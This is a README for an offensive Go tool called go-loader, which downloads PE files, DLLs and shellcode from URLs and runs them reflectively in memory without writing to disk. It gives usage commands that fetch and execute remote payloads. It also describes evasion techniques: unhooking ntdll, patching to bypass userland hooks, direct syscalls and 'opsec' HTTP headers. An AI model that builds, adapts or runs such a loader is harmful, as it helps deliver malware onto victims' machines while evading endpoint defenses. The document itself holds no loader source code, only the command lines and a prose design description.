# go-loader

a pe/dll/shellcode loader that downloads and executes files from urls in memory

## usage

```bash
# execute pe file from url
go run main.go -pe -url https://example.com/calc.exe

# execute shellcode from url  
go run main.go -shellcode -url https://example.com/shellcode.bin

# execute dll from url with specific function
go run main.go -dll -url https://example.com/mydll.dll -func MyFunction

# build
go build -o loader.exe cmd/main.go
```

## technical details

this project implements full reflective loading of pe files, dlls, and shellcode directly from downloaded byte arrays in memory without ever touching disk. the core functionality includes complete pe parsing with dos/nt header validation, section mapping with proper memory permissions (rx for .text, rw for data), base relocation processing for aslr compatibility supporting both 32-bit (image_rel_based_highlow) and 64-bit (image_rel_based_dir64) relocations, and comprehensive import address table resolution including forwarded export handling that can parse "dll.function" and "dll.#ordinal" forwarder strings and resolve them across multiple dlls. the main technical challenge was go's absolutely evil garbage collector that would intermittently move or collect our downloaded buffers during pe/dll execution, causing status_invalid_handle (0xc0000008) errors and crashes. i solved this by implementing very aggressive anti-gc techniques: runtime.keepalive calls throughout execution, completely disabling gc during critical sections with debug.setgcpercent(-1), locking goroutines to os threads with runtime.lockosthread, forcing multiple gc runs before execution to clear memory, and creating dedicated pinned byte copies that stay alive throughout the entire loading process. for pe execution we allocate memory at the preferred base address when possible or use relocations when aslr forces us elsewhere, copy headers and sections correctly, fix imports and relocations, then execute via ntcreatethreadex. for dll loading we parse export tables to find functions by name or ordinal, handle complex import resolution, and can execute specific exported functions or the dll entry point. shellcode execution uses direct ntinjectselfshellcode for self-injection. the network downloader includes proper http headers for opsec and handles the downloaded data with gc-safe buffer management. all critical syscalls go through my go-native-syscall library's direct syscall stubs after unhooking ntdll and applying patches to bypass userland hooks, though i still had to use syscall.loadlibrary a few times for import resolution since you can't avoid loading dependencies and my ldrloaddll wrapper sucks sorry guys

## credits

- [@timwhitez/Doge-MemX](https://github.com/timwhitez/Doge-MemX) for pe loader code that i adapted
- [@scriptchildie/goDLLrefletiveloader](https://github.com/scriptchildie/goDLLrefletiveloader) for dll loading code that i fixed forwarded functions and some other small issues